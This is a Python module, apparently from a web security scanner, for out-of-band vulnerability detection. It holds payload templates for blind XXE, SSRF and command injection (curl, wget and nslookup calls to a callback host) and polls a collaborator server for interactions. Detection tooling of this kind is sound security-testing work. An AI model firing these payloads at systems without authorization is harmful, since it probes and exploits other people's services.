import json
import threading
import time
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class OOBConfig:
    """Out-of-band detection configuration."""
    enabled: bool = False
    collaborator_url: Optional[str] = None
    poll_interval: int = 5
    max_polls: int = 12
    interactions: list = field(default_factory=list)


class OOBDetector:
    """Detects out-of-band vulnerabilities (blind XXE, SSRF, RCE)."""

    OOB_PAYLOADS = {
        "XXE_OOB": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{cb}/xxe">]><root>&xxe;</root>',
        ],
        "SSRF_OOB": [
            "http://{cb}/ssrf",
            "https://{cb}/ssrf",
        ],
        "RCE_OOB": [
            "curl http://{cb}/rce",
            "wget http://{cb}/rce",
            "nslookup {cb}",
        ],
    }

    def __init__(self, config: OOBConfig):
        self.config = config
        self._poll_thread: Optional[threading.Thread] = None

    def build_payload(self, category: str, callback_url: str) -> list:
        """Generate OOB payloads with callback URL injected."""
        results = []
        templates = self.OOB_PAYLOADS.get(category, [])
        for tmpl in templates:
            results.append(tmpl.format(cb=callback_url))
        return results

    def poll_interactions(self):
        """Background thread to poll collaborator for callbacks."""
        if not self.config.collaborator_url:
            return
        for _ in range(self.config.max_polls):
            if self.config.collaborator_url:
                try:
                    import requests
                    resp = requests.get(f"{self.config.collaborator_url}/interactions", timeout=10)
                    if resp.ok:
                        data = resp.json()
                        self.config.interactions.extend(data.get("interactions", []))
                except Exception:
                    pass
            time.sleep(self.config.poll_interval)

    def start_polling(self):
        if self.config.enabled and self.config.collaborator_url:
            self._poll_thread = threading.Thread(target=self.poll_interactions, daemon=True)
            self._poll_thread.start()

    def has_interactions(self) -> bool:
        return len(self.config.interactions) > 0
